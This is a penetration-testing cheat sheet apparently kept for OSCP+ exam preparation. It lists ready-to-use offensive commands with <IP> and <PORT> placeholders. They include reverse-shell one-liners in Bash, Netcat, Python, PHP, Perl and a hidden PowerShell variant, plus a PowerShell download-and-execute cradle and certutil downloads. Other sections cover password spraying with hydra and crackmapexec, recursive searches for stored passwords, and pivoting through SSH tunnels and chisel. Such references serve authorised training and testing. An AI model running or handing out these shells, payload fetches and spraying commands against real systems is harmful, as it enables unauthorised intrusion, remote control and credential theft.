# Quick Commands (OSCP+ Operator Hub)

---

# 1. LISTENERS

```bash
nc -lvnp <PORT>
rlwrap nc -lvnp <PORT>
```

---

# 2. REVERSE SHELLS

## Bash

```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

## Netcat

```bash
nc -e /bin/bash <IP> <PORT>
```

## Netcat (no -e)

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <PORT> > /tmp/f
```

## Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## PHP

```php
php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Perl

```bash
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## PowerShell (full)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

---

# 3. TTY UPGRADE

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty raw -echo; fg
```

---

# 4. FILE TRANSFER

## HTTP Server

```bash
python3 -m http.server 8000
```

## Linux Download

```bash
wget http://<IP>:8000/file
curl http://<IP>:8000/file -o file
```

## Windows Download

```powershell
certutil -urlcache -split -f http://<IP>:8000/file file
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>:8000/file.ps1')"
```

---

# 5. SMB TRANSFER

```bash
smbclient //IP/share -U user
```

Mount:

```bash
mount -t cifs //IP/share /mnt -o username=user,password=pass
```

---

# 6. PORT SCANNING

## Full

```bash
nmap -p- -T4 <IP>
```

## Fast full

```bash
nmap -p- --min-rate 1000 <IP>
```

## Service scan

```bash
nmap -sC -sV -p <PORTS> <IP>
```

## UDP (targeted)

```bash
nmap -sU --top-ports 20 <IP>
```

---

# 7. WEB ENUMERATION

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

```bash
dirsearch -u http://<IP>
```

```bash
ffuf -u http://<IP>/FUZZ -w wordlist.txt
```

---

# 8. SMB ENUMERATION

```bash
smbclient -L //<IP> -N
```

```bash
enum4linux -a <IP>
```

```bash
crackmapexec smb <IP>
```

---

# 9. LDAP / AD ENUM

```bash
ldapsearch -x -h <IP>
```

```bash
crackmapexec ldap <IP> -u user -p pass
```

---

# 10. PASSWORD SPRAYING

```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
```

```bash
hydra -L users.txt -P passwords.txt ssh://<IP>
```

---

# 11. WINRM

```bash
evil-winrm -i <IP> -u user -p pass
```

---

# 12. RDP

```bash
xfreerdp /u:user /p:pass /v:<IP>
```

---

# 13. SSH

```bash
ssh user@<IP>
```

---

# 14. PRIVESC TOOLS

## Linux

```bash
./linpeas.sh
```

## Windows

```powershell
.\winPEAS.exe
```

---

# 15. SEARCHING

## Linux

```bash
find / -name file 2>/dev/null
grep -Ri "password" / 2>/dev/null
```

## Windows

```powershell
dir /s file
findstr /si password *.txt *.xml *.ini *.config
```

---

# 16. COMMON CHECKS

## Linux

```bash
sudo -l
id
```

## Windows

```powershell
whoami /priv
```

---

# 17. PIVOTING

## SSH Tunnel

```bash
ssh -L <LOCAL_PORT>:127.0.0.1:<REMOTE_PORT> user@<IP>
```

## SOCKS Proxy

```bash
ssh -D 1080 user@<IP>
```

---

# 18. CHISEL

## Server

```bash
chisel server -p 8000 --reverse
```

## Client

```bash
chisel client <IP>:8000 R:1080:socks
```

---

# 19. MISC

## Python PTY fallback

```bash
script /dev/null -c bash
```

## Spawn shell

```bash
/bin/sh -i
```

---

# 20. REMINDERS

* Replace <IP> and <PORT>
* Stabilize shells immediately
* Reuse credentials across services
* If one method fails → try another
